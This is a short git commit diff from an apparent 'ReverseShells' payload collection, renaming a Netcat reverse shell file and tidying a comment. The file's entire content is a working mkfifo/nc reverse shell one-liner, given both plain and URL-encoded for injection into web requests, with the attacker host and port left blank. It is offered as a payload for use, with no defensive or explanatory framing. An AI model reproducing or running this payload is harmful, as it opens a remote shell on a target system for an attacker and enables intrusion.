14b265f53e43863d712a064b7f72cdb3cbcea562
calvin <74103103+Calvindd2f@users.noreply.github.com>
2022-06-16 20:52:26 +0000

    Update and rename Netcat rShell to Netcat rShell.zsh

--- ReverseShells/Netcat rShell.zsh
+++ ReverseShells/Netcat rShell.zsh
@@ -1,5 +1,4 @@
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc   >/tmp/f
 
-#URL ENCODED
-
+# URL ENCODED
 rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7C/bin/sh%20-i%202%3E&1%7Cnc%20%20%20%3E/tmp/f
